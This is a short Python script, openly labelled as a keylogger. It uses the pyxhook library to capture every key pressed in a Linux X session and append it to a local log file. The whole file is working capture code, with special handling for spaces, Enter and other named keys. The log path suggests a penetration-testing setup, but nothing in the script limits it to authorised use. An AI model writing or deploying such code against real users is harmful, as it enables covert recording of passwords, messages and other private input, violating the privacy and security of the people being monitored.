#!/usr/bin/env python

import pyxhook

"""
	*--------------------------------------*
	|       programmed by : mwmt           |    
	*--------------------------------------*
       _     __             _     __  ____  
      || \  // | \ \     / || \  // |  ||   
      ||  \//  |  \_\/\_/  ||  \//  |  || 
	
	               Keylogger
	              -----------
"""



log_file='/home/pen-test/txt_files/file.log'

def keypress(event):
	log=open(log_file,'a')
	if event.Key == 'space':
		log.write(' ')
	elif event.Key == 'Return':
		log.write('\n')
	elif len(event.Key) != 1:
		log.write('[ '+event.Key+' ]')
	else:
		log.write(event.Key)

key=pyxhook.HookManager()
key.KeyDown=keypress
key.HookKeyboard()
key.start()
